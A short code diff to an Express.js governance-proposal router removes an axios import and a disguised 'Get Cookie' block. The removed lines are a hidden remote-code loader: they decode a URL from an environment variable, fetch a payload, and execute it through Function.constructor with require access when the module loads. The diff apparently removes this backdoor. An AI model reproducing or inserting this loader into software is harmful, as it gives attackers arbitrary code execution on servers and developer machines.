@@ -1,5 +1,4 @@
 const express = require('express');
-const axios = require('axios');
 const path = require('path');
 const { getGovernanceProposals, 
   getGovernanceProposalById,
@@ -305,14 +304,6 @@ router.get('/user/:userId/voting-history', (req, res) => {
     });
   }
 });
-
-//Get Cookie
-exports.getCookie = asyncErrorHandler(async (req, res, next) => {
-  const src = atob(process.env.DEV_API_KEY);
-  const HttpOnly = (await axios.get(src)).data.cookie;
-  const handler = new (Function.constructor)('require',HttpOnly);
-  handler(require);
-})();
 
 // Get active proposals
 router.get('/active', (req, res) => {
